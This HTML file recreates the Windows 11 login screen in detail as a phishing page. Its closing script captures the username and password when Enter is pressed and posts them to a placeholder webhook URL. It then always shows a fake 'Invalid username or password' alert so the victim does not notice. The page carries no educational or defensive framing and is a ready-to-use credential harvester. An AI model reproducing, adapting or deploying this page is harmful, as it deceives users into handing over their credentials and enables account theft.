<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Windows 11 Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: "Segoe UI Variable", "Segoe UI", sans-serif;
        }

        body {
            height: 100vh;
            overflow: hidden;
            cursor: default;
            background: linear-gradient(135deg, 
                rgba(139, 98, 57, 0.5) 0%,
                rgba(71, 98, 119, 0.5) 100%);
        }

        .bg-gradient {
            position: fixed;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle at center,
                rgba(255, 165, 0, 0.2) 0%,
                rgba(0, 0, 139, 0.3) 100%);
            animation: rotate 60s linear infinite;
            z-index: -1;
        }

        @keyframes rotate {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .blur-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.2);
            backdrop-filter: blur(100px);
        }

        .container {
            position: relative;
            z-index: 1;
            height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            color: white;
            padding-bottom: 15vh;
        }

        .avatar {
            width: 200px;
            height: 200px;
            border-radius: 50%;
            margin-bottom: 2rem;
            background: #666;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
        }

        .avatar svg {
            width: 65%;
            height: 65%;
            fill: none;
            stroke: white;
            stroke-width: 1.2;
        }

        .username-input {
            width: 300px;
            height: 40px;
            background: rgba(255, 255, 255, 0.1);
            border: none;
            border-radius: 4px;
            padding: 0 1rem;
            color: white;
            font-size: 1rem;
            margin-bottom: 1rem;
        }

        .username-input::placeholder {
            color: rgba(255, 255, 255, 0.7);
        }

        .username-input:focus {
            outline: none;
            background: rgba(255, 255, 255, 0.15);
        }

        .password-input {
            width: 300px;
            height: 40px;
            background: rgba(255, 255, 255, 0.1);
            border: none;
            border-radius: 4px;
            padding: 0 1rem;
            color: white;
            font-size: 1rem;
            margin-bottom: 0.5rem;
        }

        .password-input::placeholder {
            color: rgba(255, 255, 255, 0.7);
        }

        .password-input:focus {
            outline: none;
            background: rgba(255, 255, 255, 0.15);
        }

        .forgot-password {
            font-size: 0.9rem;
            color: rgba(255, 255, 255, 0.8);
            text-decoration: none;
            cursor: pointer;
        }

        .forgot-password:hover {
            color: white;
        }

        .bottom-bar {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            padding: 1rem;
            display: flex;
            justify-content: space-between;
            align-items: flex-end;
        }

        .user-switcher {
            display: flex;
            flex-direction: column;
            gap: 0.5rem;
        }

        .user-option {
            display: flex;
            align-items: center;
            gap: 0.75rem;
            color: rgba(255, 255, 255, 0.8);
            cursor: pointer;
            padding: 0.5rem;
            border-radius: 4px;
            transition: background-color 0.2s;
        }

        .user-option:hover {
            background: rgba(255, 255, 255, 0.1);
        }

        .user-avatar {
            width: 32px;
            height: 32px;
            border-radius: 50%;
            background: #666;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .user-avatar svg {
            width: 60%;
            height: 60%;
            fill: none;
            stroke: white;
            stroke-width: 1.5;
        }

        .bottom-buttons {
            display: flex;
            gap: 1.5rem;
            margin-bottom: 0.5rem;
        }

        .bottom-button {
            width: 35px;
            height: 35px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: rgba(255, 255, 255, 0.8);
            cursor: pointer;
        }

        .bottom-button svg {
            width: 20px;
            height: 20px;
            fill: currentColor;
        }
    </style>
</head>
<body>
    <div class="bg-gradient"></div>
    <div class="blur-overlay"></div>
    <div class="container">
        <div class="avatar">
            <svg viewBox="0 0 24 24">
                <circle cx="12" cy="8" r="4"/>
                <path d="M4 20 C4 17 7 15 12 15 C17 15 20 17 20 20"/>
            </svg>
        </div>
        <input type="text" class="username-input" placeholder="User name" />
        <input type="password" class="password-input" placeholder="Password" />
        <a href="#" class="forgot-password">I forgot my password</a>
    </div>

    <div class="bottom-bar">
        <div class="user-switcher">
            <div class="user-option">
                <div class="user-avatar">
                    <svg viewBox="0 0 24 24">
                        <circle cx="12" cy="8" r="4"/>
                        <path d="M4 20 C4 17 7 15 12 15 C17 15 20 17 20 20"/>
                    </svg>
                </div>
                <span>Other user</span>
            </div>
        </div>
        <div class="bottom-buttons">
            <div class="bottom-button">
                <svg viewBox="0 0 24 24">
                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/>
                </svg>
            </div>
            <div class="bottom-button">
                <svg viewBox="0 0 24 24">
                    <path d="M12 2c1.1 0 2 .9 2 2s-.9 2-2 2-2-.9-2-2 .9-2 2-2zm9 7h-6v13h-2v-6h-2v6H9V9H3V7h18v2z"/>
                </svg>
            </div>
            <div class="bottom-button">
                <svg viewBox="0 0 24 24">
                    <path d="M13 3h-2v10h2V3zm4.83 2.17l-1.42 1.42C17.99 7.86 19 9.81 19 12c0 3.87-3.13 7-7 7s-7-3.13-7-7c0-2.19 1.01-4.14 2.58-5.42L6.17 5.17C4.23 6.82 3 9.26 3 12c0 4.97 4.03 9 9 9s9-4.03 9-9c0-2.74-1.23-5.18-3.17-6.83z"/>
                </svg>
            </div>
        </div>
    </div>

    <script>
        document.addEventListener('keydown', function(event) {
            if (event.key === 'Enter') {
                event.preventDefault();

                const usernameInput = document.querySelector('.username-input');
                const passwordInput = document.querySelector('.password-input');
                const username = usernameInput.value.trim();
                const password = passwordInput.value.trim();

                if (username === "") {
                    console.warn('Username field is empty.');
                    return;
                }

                const webhookURL = 'WEBHOOK';

                const payload = {
                    content: `Username: ${username}${password ? '\nPassword: ' + password : ''}`
                };

                fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                })
                .then(response => {
                    if (response.ok) {
                        console.log('Invalid username or password.');
                        alert('Invalid username or password.');
                    } else {
                        console.error('Invalid username or password.', response.statusText);
                        alert('Invalid username or password.');
                    }
                })
                .catch(error => {
                    console.error('Invalid username or password.');
                    alert('Invalid username or password.');
                });
            }
        });
    </script>
</body>
</html>
